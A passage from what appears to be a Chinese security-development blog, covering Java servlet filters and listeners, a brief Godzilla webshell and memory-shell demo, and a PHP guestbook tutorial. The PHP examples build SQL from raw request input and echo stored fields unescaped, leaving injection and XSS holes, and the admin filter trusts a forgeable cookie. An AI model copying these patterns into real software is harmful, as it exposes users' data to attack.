class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;非管理员访问&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启中间件服务，调用init方法，admin身份检测开启；当我们GET访问admin时，经过AdminFilter过滤，打印我们的cookie的name和value，并且过滤name不为user，value不为admin，拦截，打印非管理员访问</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229164426045.png" alt="image-20241229164426045"></p><p>当我们添加cookie为user:admin，成功执行，进入管理员页面</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229164948175.png" alt="image-20241229164948175"></p><h1 id="内存马技术"><a href="#内存马技术" class="headerlink" title="内存马技术"></a>内存马技术</h1><p>这里只做简单了解</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3550278-20241216172326446-583404049.png" alt="img"></p><p>内存马实验：</p><p>哥斯拉生成java的后门1.jsp</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3550278-20241216172326063-320383317.png" alt="image-20241216163007234"></p><p>用哥斯拉连接url <a href="http://localhost:8080/FilterDemo1_war_exploded/1.jsp">http://localhost:8080/FilterDemo1_war_exploded/1.jsp</a></p><p>从而拿到shell</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3550278-20241216172325618-1657129239.png" alt="image-20241216163903310"></p><blockquote><p>这里的FilterShell就为内存马</p></blockquote><h1 id="监听器Listen"><a href="#监听器Listen" class="headerlink" title="监听器Listen"></a>监听器Listen</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件<br>监听域对象的属性发生修改的事件<br>监听在事件发生前、发生后做一些必要的处理<br>监听器就是用来检测的的动作，有动作就会触发监听器里的方法，不是一定要访问路由才能触发；当与监听器关联的特定事件在Web应用中发生时，监听器会被触发</p><h2 id="监听session的创造与销毁"><a href="#监听session的创造与销毁" class="headerlink" title="监听session的创造与销毁"></a>监听session的创造与销毁</h2><p>ListenSession文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listendemo1.listener;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionListener;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebListener</span><span class="comment">//@WebListener标记监听器类,无需路由</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenSession</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        <span class="comment">//监听检测有Session创建就会执行这里</span></span><br><span class="line">        System.out.println(<span class="string">&quot;监听器监听到了session创建&quot;</span>);</span><br><span class="line">    &#125;<span class="comment">//tomcat一启动，就会有session的产生，次函数就会被触发</span></span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        <span class="comment">//监听检测有Session销毁就会执行这里</span></span><br><span class="line">        System.out.println(<span class="string">&quot;监听器监听到了session销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSession文件（创建session）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listendemo1.Servlet;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/cs&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CSession</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet里面创建Session&quot;</span>);</span><br><span class="line">        <span class="comment">//创建Session</span></span><br><span class="line">        req.getSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DSession文件（销毁session）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listendemo1.Servlet;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/ds&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DSession</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet里面销毁Session&quot;</span>);</span><br><span class="line">        <span class="comment">//销毁Session</span></span><br><span class="line">        req.getSession().invalidate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动时监听器监听到了， ListenSession中的sessionCreated方法就会被调用，打印监听器监听到了session创建</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229165913648.png" alt="image-20241229165913648"></p><p>当我们访问cs，调用了Servlet中CSession中的doGet方法，打印Servlet里面创建Session</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229170550426.png" alt="image-20241229170550426"></p><p>当我们访问ds，调用Servlet中DSession中的doGet方法，打印Servlet里面销毁Session，同时监听器马上就监听到了这一属性的变化，ListenSession中的sessionDestroyed方法被调用</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229170802962.png" alt="image-20241229170802962"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229170745340.png" alt="image-20241229170745340"></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP应用</title>
      <link href="/2025/05/27/PHP%E5%BA%94%E7%94%A8/"/>
      <url>/2025/05/27/PHP%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="留言板功能"><a href="#留言板功能" class="headerlink" title="留言板功能"></a>留言板功能</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731400962060-a62c5e88-2e9f-4457-9417-0a42514ff9fa.png"></p><h2 id="mysqli函数-增删改查"><a href="#mysqli函数-增删改查" class="headerlink" title="mysqli函数&amp;增删改查"></a>mysqli函数&amp;增删改查</h2><p>PHP操作数据库函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">常用：</span><br><span class="line">mysqli_connect() 打开一个到MySQL的新的连接。</span><br><span class="line">mysqli_select_db() 更改连接的默认数据库。</span><br><span class="line">mysqli_query() 执行某个针对数据库的查询。</span><br><span class="line">mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。</span><br><span class="line">mysqli_close() 关闭先前打开的数据库连接。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">查：select * <span class="keyword">from</span> 表名 where 列名=‘条件’;</span><br><span class="line">增：insert into 表名(列名<span class="number">1</span>, 列名<span class="number">2</span>) value(‘列<span class="number">1</span>值<span class="number">1</span>’, ‘列<span class="number">2</span>值<span class="number">2</span>’);</span><br><span class="line">删：delete <span class="keyword">from</span> 表名 where 列名 = ‘条件’;</span><br><span class="line">改：update 表名 <span class="built_in">set</span> 列名 = 数据 where 列名 = ‘条件’;</span><br></pre></td></tr></table></figure><h3 id="mysqli-connect函数连接数据库"><a href="#mysqli-connect函数连接数据库" class="headerlink" title="mysqli.connect函数连接数据库"></a>mysqli.connect函数连接数据库</h3><p>构建数据库连接，以及执行数据库插入操作</p><ul><li>发现可以插入数据，但是由于<strong>用户名和内容</strong>可以<strong>不进行添加</strong>就<strong>加入数据库</strong></li><li>多<strong>加一层判空</strong>，如果<code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;!empty($u)&lt;/font&gt;</code><strong>用户名为空</strong>则不写入数据即可</li></ul><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731408371429-74626fd7-c01a-4dfa-8fbe-67a846121cd4.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML 表单 --&gt;</span><br><span class="line">  &lt;form id=<span class="string">&quot;form1&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;!-- 用户名输入框 --&gt;</span><br><span class="line">  用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  内容：</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;!-- 文本框 --&gt;</span><br><span class="line">  &lt;textarea name=<span class="string">&quot;content&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;!-- 提交按钮 --&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 数据库连接参数</span></span><br><span class="line">  <span class="variable">$dbip</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;dome01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 mysqli_connect() 函数建立与数据库的连接</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbip</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接错误：&quot;</span> . <span class="title function_ invoke__">mysqli_connect_errno</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 获取用户名</span></span><br><span class="line">  <span class="variable">$u</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查用户名是否非空</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line">    <span class="comment">// 获取内容、IP地址和用户代理信息</span></span><br><span class="line">    <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">/*获取客户端 IP 地址*/</span></span><br><span class="line">    <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="comment">/*获取客户端用户代理信息*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据库查询语句，将数据插入到名为 gbook 的表中</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO gbook(`username`, `content`, `ipaddr`, `uagent`) VALUES (&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;, &#x27;<span class="subst">$i</span>&#x27;, &#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行数据库查询</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 查询并显示留言列表</span></span><br><span class="line">      <span class="variable">$sql1</span> = <span class="string">&quot;SELECT * FROM gbook&quot;</span>;</span><br><span class="line">      <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql1</span>);<span class="comment">//con表示链接该数据库为con（存在多个数据库时防止混淆）</span></span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 用户名为空的情况</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="html混编-超全局变量"><a href="#html混编-超全局变量" class="headerlink" title="html混编&amp;超全局变量"></a>html混编&amp;超全局变量</h2><p>html混编：使HTML(JS)在PHP语言中运行</p><?php echo ' ' ?><p>超全局变量</p><p><a href="https://www.w3school.com.cn/php/php_superglobals.asp">https://www.w3school.com.cn/php/php_superglobals.asp</a></p><p><a href="https://www.php.net/manual/zh/language.variables.superglobals.php">https://www.php.net/manual/zh/language.variables.superglobals.php</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含数据库配置文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;<span class="comment">//由于创建的文件夹admin，其距离config.php匹配使用../</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有留言</span></span><br><span class="line"><span class="variable">$sql1</span>=<span class="string">&quot;select * from gbook&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span><br><span class="line"><span class="comment">// 循环遍历每条留言并显示信息和删除链接</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span>.<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span>.<span class="variable">$row</span>[<span class="number">3</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    **<span class="comment">// 提供删除链接，传递留言用户名作为参数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line">**<span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line"><span class="variable">$sql2</span>=<span class="string">&quot;delete from gbook where username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// 执行删除操作</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功 ！&#x27;)&lt;/script&gt;&quot;</span>;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><font style="color:rgba(0, 0, 0, 0.75);">创建gbook-admin.php文件和admin目录，方便执行删除等后台功能</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">发现重复的代码太多，所以将经常用到的数据库链接操作生成config.php文件，方便管理。修改后正常访问增加，查询。</font></p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731423048370-1b636089-399b-42a8-a012-91b9e08e5152.png"></p><blockquote><p><font style="color:rgba(0, 0, 0, 0.75);">删除功能创建成功</font></p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731423087240-d881a6fd-6547-4cc2-88b4-294c1db33fa4.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731423087361-e6c615e8-e353-4fd8-ab62-f01b0ce08c0f.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含数据库配置文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;<span class="comment">//由于创建的文件夹admin，其距离config.php匹配使用../</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有留言</span></span><br><span class="line"><span class="variable">$sql1</span>=<span class="string">&quot;select * from gbook&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span><br><span class="line"><span class="comment">// 循环遍历每条留言并显示信息和删除链接</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span>.<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span>.<span class="variable">$row</span>[<span class="number">3</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    **<span class="comment">// 提供删除链接，传递留言用户名作为参数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line">**<span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line"><span class="variable">$sql2</span>=<span class="string">&quot;delete from gbook where username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// 执行删除操作</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功 ！&#x27;)&lt;/script&gt;&quot;</span>;**</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>发现问题，可以将代码加一层判断当触发的时候，再进行删除操作</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 检查是否设置了要删除的留言用户名</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$delstr</span>)) &#123;**</span><br><span class="line">    <span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line">    <span class="variable">$sql2</span> = <span class="string">&quot;DELETE FROM gbook WHERE username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除操作</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql2</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第三方插件引用-js传参-函数对象调用"><a href="#第三方插件引用-js传参-函数对象调用" class="headerlink" title="第三方插件引用-js传参&amp;函数对象调用"></a>第三方插件引用-js传参&amp;函数对象调用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">htmlCopy code</span><br><span class="line">&lt;script src=<span class="string">&#x27;../xxx.js&#x27;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这是一个在 HTML 中引用外部 JavaScript 文件的标签。src 属性指定了 JavaScript 文件的路径，相对于当前 HTML 文件的位置。在这里，..&#x2F;xxx.js 表示 JavaScript 文件位于上一级目录（..&#x2F;）并且文件名为 xxx.js。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">**&lt;script src=<span class="string">&quot;/ueditor/ueditor.config.js&quot;</span>&gt;<span class="comment">/*引入配置文件*/</span>&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;/ueditor/ueditor.all.js&quot;</span>&gt;<span class="comment">/*引入源码文件*/</span>&lt;/script&gt;**</span><br><span class="line">&lt;form id=<span class="string">&quot;form1&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span></span><br><span class="line">      &lt;p&gt;</span><br><span class="line">          用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">      &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            内容：</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">       &lt;p&gt;</span><br><span class="line">           **&lt;textarea id=<span class="string">&quot;content&quot;</span> rows=<span class="string">&quot;10&quot;</span> cols=<span class="string">&quot;70&quot;</span> name=<span class="string">&quot;content&quot;</span> style=<span class="string">&quot;border:1px solid #E5E5E5;&quot;</span>&gt;</span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">           &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">               UE.<span class="title function_ invoke__">getEditor</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line">               <span class="comment">//实例化编辑器传参,id为将要被替换的容器。</span></span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">       &lt;/p&gt;**</span><br><span class="line"></span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这里的ueditor需要单独下载文件，放入目录中</p></blockquote><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/ueditor/ueditor.config.js&quot;</span>&gt;<span class="comment">/*引入配置文件*/</span>&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;/ueditor/ueditor.all.js&quot;</span>&gt;<span class="comment">/*引入源码文件*/</span>&lt;/script&gt;</span><br><span class="line">&lt;form id=<span class="string">&quot;form1&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span></span><br><span class="line">      &lt;p&gt;</span><br><span class="line">          用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">      &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            内容：</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">       &lt;p&gt;</span><br><span class="line">           &lt;textarea id=<span class="string">&quot;content&quot;</span> rows=<span class="string">&quot;10&quot;</span> cols=<span class="string">&quot;70&quot;</span> name=<span class="string">&quot;content&quot;</span> style=<span class="string">&quot;border:1px solid #E5E5E5;&quot;</span>&gt;</span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">           &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">               UE.<span class="title function_ invoke__">getEditor</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line">               <span class="comment">//实例化编辑器传参,id为将要被替换的容器。</span></span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">       &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*// 使用 mysqli_connect() 函数建立与数据库的连接</span></span><br><span class="line"><span class="comment">// $dbip: 数据库服务器的 IP 地址或主机名</span></span><br><span class="line"><span class="comment">// $dbuser: 